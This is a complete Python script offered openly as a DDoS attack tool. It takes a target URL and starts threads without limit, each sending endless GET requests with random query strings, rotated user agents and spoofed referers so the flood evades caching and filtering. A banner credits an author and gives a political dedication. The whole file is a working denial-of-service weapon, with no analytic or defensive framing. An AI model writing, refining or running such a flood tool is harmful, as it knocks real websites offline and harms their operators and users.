import os
import requests
import threading
import random


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ZH = '\033[97m'


if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")
print(" ")                                  
print("\033[31m  ©©      ©     ©© ©    © © © ©©         \033[0m")
print("\033[31m  ©© ©    ©   ©©     ©       ©©                  \033[0m")                 
print("\033[31m  ©©  ©   ©   ©©     ©      ©©                        \033[0m")                 
print("\033[96m  ©©   ©  ©   ©©     ©     ©©                 \033[0m")             
print("\033[96m  ©©    © ©   ©©     ©    ©©               \033[0m")            
print("\033[96m  ©©      ©     ©© ©     ©© © © ©            \033[0m")            
print("\033[96m  ••      •     •• •     ••   •               \033[0m")            
print("\033[96m   •             •        • •                  \033[0m")             
print("\033[33m  ______________________________________By: Za'99__ \033[0m")     
print("\033[1m [[  Z  N  E  E  P  E  R  S    A  T  T  A  C  K   ]] \033[0m")    
print("\033[33m [[                                               ]] \033[0m")   
print("\033[1m [[            F O R   F A L E S T I N E          ]] \033[0m")    
print("\033[33m [[_______________________________________________]] \033[0m")      
print("\033[32m==============>>>\033[0m")
url = input("URL:  ").strip()


count = 0
headers = []
referer = [
    "https://google.it/",
    "https://facebook.com/",
    "https://alibaba.com/",
    "https://google.com/",
    "https://youtube.com",
    
]


def useragent():
    global headers
    
    headers.append("Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11")
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6")
    headers.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6")
    headers.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1")
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5")
    headers.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5")
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3")
    headers.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3")
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3")
    headers.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3")
    headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3")
    headers.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3")
    headers.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3")
    headers.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3")
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
    headers.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")

    return headers


def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                count += 1
                print ("{0}\033[94mN0Z-DDoS  [\033[33mREQUEST SEND TO  [\033[1m" +url+ " \033[0m".format(count))
            except requests.exceptions.ConnectionError:
                print ("[Server might be down!]")
                pass
            except requests.exceptions.InvalidSchema:
                print ("[URL Error]")
                raise SystemExit()
            except ValueError:
                print ("[Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
